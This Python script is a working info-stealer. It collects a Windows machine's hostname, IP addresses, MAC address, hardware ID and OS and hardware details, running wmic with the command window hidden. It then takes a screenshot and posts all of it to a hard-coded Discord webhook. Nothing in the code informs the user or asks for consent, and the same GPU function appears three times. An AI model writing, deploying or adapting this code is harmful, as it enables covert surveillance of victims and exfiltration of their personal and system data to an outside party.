import requests
import socket
import uuid
import platform
import psutil
import threading
import subprocess
import re
import pyautogui  # For taking screenshots
import os
from PIL import ImageGrab  # Alternative method for screenshots

# Replace with your actual Discord webhook
WEBHOOK_URL = "https://discord.com/api/webhooks/1337690537716617236/65it_yqKBVgIQeCPJVGVUqDmz3S7bmXhcG-f5gUIFzdAHKO0N5yoauwZyBvQzi54y-BF"
def get_gpu_info():
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW  # Hides CMD window
        result = subprocess.check_output(
            "wmic path win32_videocontroller get caption",
            shell=True, startupinfo=startupinfo
        ).decode()
        return result.split("\n")[1].strip() if len(result.split("\n")) > 1 else "N/A"
    except:
        return "Could not retrieve"

def get_local_ip():
    try:
        return socket.gethostbyname(socket.gethostname())
    except:
        return "N/A"

def get_public_ip():
    try:
        return requests.get("https://api64.ipify.org?format=json", timeout=3).json()["ip"]
    except:
        return "Could not retrieve"

def get_mac_address():
    return ':'.join(re.findall('..', '%012x' % uuid.getnode()))

def get_hardware_id():
    return str(uuid.UUID(int=uuid.getnode()))

def get_system_info():
    info = {
        "Hostname": socket.gethostname(),
        "Local IP": get_local_ip(),
        "MAC Address": get_mac_address(),
        "Hardware ID": get_hardware_id(),
        "OS": f"{platform.system()} {platform.release()} ({platform.architecture()[0]})",
        "OS Version": platform.version(),
        "Processor": platform.processor(),
        "CPU Cores": psutil.cpu_count(logical=False),
        "Logical CPUs": psutil.cpu_count(logical=True),
        "RAM Size": f"{round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB",
        "Disk Storage": f"{round(psutil.disk_usage('/').total / (1024 ** 3), 2)} GB"
    }
    return info

def get_gpu_info():
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW  # Hides CMD window
        result = subprocess.check_output(
            "wmic path win32_videocontroller get caption",
            shell=True, startupinfo=startupinfo
        ).decode()
        return result.split("\n")[1].strip() if len(result.split("\n")) > 1 else "N/A"
    except:
        return "Could not retrieve"

def get_motherboard_info():
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW  # Hides CMD window
        result = subprocess.check_output(
            "wmic baseboard get product",
            shell=True, startupinfo=startupinfo
        ).decode()
        return result.split("\n")[1].strip() if len(result.split("\n")) > 1 else "N/A"
    except:
        return "Could not retrieve"

def send_to_discord(info):
    """Send system information to Discord."""
    data = {
        "content": "**System Information**",
        "embeds": [
            {
                "title": "PC Info",
                "color": 16711680,  # Red
                "fields": [{"name": key, "value": str(value), "inline": False} for key, value in info.items()]
            }
        ]
    }

    response = requests.post(WEBHOOK_URL, json=data)
def get_gpu_info():
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW  # Hides CMD window
        result = subprocess.check_output(
            "wmic path win32_videocontroller get caption",
            shell=True, startupinfo=startupinfo
        ).decode()
        return result.split("\n")[1].strip() if len(result.split("\n")) > 1 else "N/A"
    except:
        return "Could not retrieve"
def take_screenshot():
    """Capture a screenshot of the current screen and save it."""
    screenshot_path = os.path.join(os.getenv("TEMP"), "screenshot.png")
    try:
        # Use PyAutoGUI for cross-platform support
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)
        return screenshot_path
    except Exception as e:
        print(f"Screenshot capture failed: {e}")
        return None

def send_screenshot():
    """Capture a screenshot and send it to Discord."""
    screenshot_path = take_screenshot()
    if not screenshot_path:
        print("No screenshot to send.")
        return

    with open(screenshot_path, "rb") as file:
        files = {"file": file}
        response = requests.post(WEBHOOK_URL, files=files)

    if response.status_code == 204:
        print("Screenshot sent successfully!")
    else:
        print(f"Failed to send screenshot. Status code: {response.status_code}")

if __name__ == "__main__":
    system_info = get_system_info()

    # Run network-based tasks in parallel (faster execution)
    threads = [
        threading.Thread(target=lambda: system_info.update({"Public IP": get_public_ip()})),
        threading.Thread(target=lambda: system_info.update({"GPU": get_gpu_info()})),
        threading.Thread(target=lambda: system_info.update({"Motherboard": get_motherboard_info()})),
    ]

    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

    send_to_discord(system_info)

    # Capture and send screenshot
    send_screenshot()
